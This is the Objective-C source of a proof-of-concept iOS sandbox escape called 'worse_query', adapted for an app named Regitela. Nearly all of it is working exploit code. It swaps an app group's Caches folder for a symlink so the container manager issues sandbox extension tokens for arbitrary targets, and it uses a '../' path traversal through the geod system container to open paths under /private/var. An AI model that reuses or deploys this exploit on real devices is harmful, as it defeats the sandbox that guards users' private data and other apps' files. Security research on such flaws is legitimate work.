/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)
     Modified for Regitela by ichitaso, 2026.

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <string.h>
#include "SandboxEscape.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef void *(*container_object_copy_fn)(void *);
typedef void (*container_object_free_fn)(void *);
typedef bool (*container_object_activate_fn)(void *, bool);
typedef const char *(*container_object_get_path_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);
typedef void *(*sec_task_create_from_self_fn)(CFAllocatorRef);
typedef CFTypeRef (*sec_task_copy_value_for_entitlement_fn)(void *, CFStringRef, CFErrorRef *);

static void clean_symlink(NSString *group) {
    if (group != NULL) {
        NSFileManager *files = [NSFileManager defaultManager];
        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
        if (groupRoot) {
            NSURL *caches = [groupRoot URLByAppendingPathComponent: @"Library/Caches"];
            [files removeItemAtURL: caches error: nil];
            [files createDirectoryAtURL: caches withIntermediateDirectories: false attributes: nil error: nil];
        }
    }
    return;
}

static char last_extension_class[128];

NSString *worse_query_last_extension_class(void) {
    return last_extension_class[0] ? [NSString stringWithUTF8String: last_extension_class] : nil;
}

static void remember_extension_class(const char *token) {
    last_extension_class[0] = 0;
    for (NSString *field in [[NSString stringWithUTF8String: token] componentsSeparatedByString: @";"]) {
        if ([field hasPrefix: @"com.apple."]) {
            strlcpy(last_extension_class, field.UTF8String, sizeof(last_extension_class));
            break;
        }
    }
}

int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }
    
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    if (!groupRoot) return -1;
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
    
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -2;
    }
    
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3;
    }
    
    xpc_object_t identifier;
    query_set_class(query, 7); // We're only using class 7 here (appGroup), which goes to containermanagerd
    identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // The query's part sets our base path, part 3 is Library/Caches
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL); // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    [files removeItemAtPath: caches error: nil];
    if ([files createSymbolicLinkAtPath: caches withDestinationPath: target error: nil] == false) {
        dlclose(mgr);
        return -4;
    }
    
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -5;
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -6;
    }
    
    remember_extension_class(token);
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    dlclose(mgr);
    clean_symlink(group);
    
    return handle;
}

// No detachable token on iOS 26: the container object holds the live extension
// (freeing it revokes access), so keep each in a table keyed by a tagged handle.
#define GEOD_HANDLE_BASE 0x4000000000LL
#define GEOD_SLOTS 32
static void *geod_objects[GEOD_SLOTS];
static container_object_free_fn geod_free_fn;
static char geod_last_path_buf[1024];

NSString *geod_last_path(void) {
    return geod_last_path_buf[0] ? [NSString stringWithUTF8String: geod_last_path_buf] : nil;
}

static int geod_store(void *object, container_object_free_fn freeFn) {
    geod_free_fn = freeFn;
    for (int i = 0; i < GEOD_SLOTS; i++) {
        if (geod_objects[i] == NULL) {
            geod_objects[i] = object;
            return i;
        }
    }
    return -1;
}

void geod_release(int64_t handle) {
    int slot = (int)(handle - GEOD_HANDLE_BASE);
    if (slot < 0 || slot >= GEOD_SLOTS) return;
    void *object = geod_objects[slot];
    geod_objects[slot] = NULL;
    if (object && geod_free_fn) geod_free_fn(object);
}

// geod class-12 partDomain traversal (Geod-MCM-PoC by 0xjohnny): the base is
// com.apple.geod/Library/Caches, so six "../" reach /private/var, then descend.
int64_t geod_query(NSString *target) {
    struct stat st;
    if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;

    NSString *relative = nil;
    for (NSString *prefix in @[@"/private/var/", @"/var/"]) {
        if ([target hasPrefix: prefix]) { relative = [target substringFromIndex: prefix.length]; break; }
    }
    if (!relative) return -255;
    NSString *part = [@"../../../../../../" stringByAppendingString: relative];

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_object_copy_fn object_copy = (container_object_copy_fn)dlsym(mgr, "container_object_copy");
    container_object_free_fn object_free = (container_object_free_fn)dlsym(mgr, "container_object_free");
    container_object_activate_fn object_activate = (container_object_activate_fn)dlsym(mgr, "container_object_sandbox_extension_activate");
    container_object_get_path_fn object_get_path = (container_object_get_path_fn)dlsym(mgr, "container_object_get_path");
    if (!query_create || !query_set_class || !query_set_identifiers || !query_set_flags || !query_set_part || !query_set_part_domain || !query_get_single_result || !query_free || !object_copy || !object_free || !object_activate) {
        dlclose(mgr);
        return -2;
    }

    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3;
    }

    query_set_class(query, 12); // system-data container
    xpc_object_t identifier = xpc_string_create("com.apple.geod");
    query_set_identifiers(query, identifier);
    query_set_flags(query, 0x0000008100000000ULL);
    query_set_part(query, 3); // Library/Caches
    query_set_part_domain(query, part.fileSystemRepresentation);

    void *borrowed = query_get_single_result(query);
    void *object = borrowed ? object_copy(borrowed) : NULL;
    query_free(query);
    if (!object) {
        return -5;
    }
    const char *resolved = object_get_path ? object_get_path(object) : NULL;
    geod_last_path_buf[0] = 0;
    if (resolved) strlcpy(geod_last_path_buf, resolved, sizeof(geod_last_path_buf));
    if (!object_activate(object, false)) {
        object_free(object);
        return -6;
    }

    int slot = geod_store(object, object_free);
    if (slot < 0) {
        object_free(object);
        return -7;
    }
    return GEOD_HANDLE_BASE + slot;
}

NSString *worse_query_group(void) {
    NSMutableArray<NSString *> *groups = [NSMutableArray array];

    void *security = dlopen("/System/Library/Frameworks/Security.framework/Security", RTLD_NOW | RTLD_LOCAL);
    if (security) {
        sec_task_create_from_self_fn task_create = (sec_task_create_from_self_fn)dlsym(security, "SecTaskCreateFromSelf");
        sec_task_copy_value_for_entitlement_fn copy_value = (sec_task_copy_value_for_entitlement_fn)dlsym(security, "SecTaskCopyValueForEntitlement");
        if (task_create && copy_value) {
            void *task = task_create(kCFAllocatorDefault);
            if (task) {
                CFTypeRef value = copy_value(task, CFSTR("com.apple.security.application-groups"), NULL);
                if (value) {
                    if (CFGetTypeID(value) == CFArrayGetTypeID()) {
                        for (id group in (__bridge NSArray *)value) {
                            if ([group isKindOfClass: [NSString class]]) [groups addObject: group];
                        }
                    }
                    CFRelease(value);
                }
                CFRelease(task);
            }
        }
    }
    [groups addObject: @"group.com.ichitaso.regitela"];

    NSFileManager *files = [NSFileManager defaultManager];
    for (NSString *group in groups) {
        if ([files containerURLForSecurityApplicationGroupIdentifier: group]) return group;
    }
    return nil;
}

void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
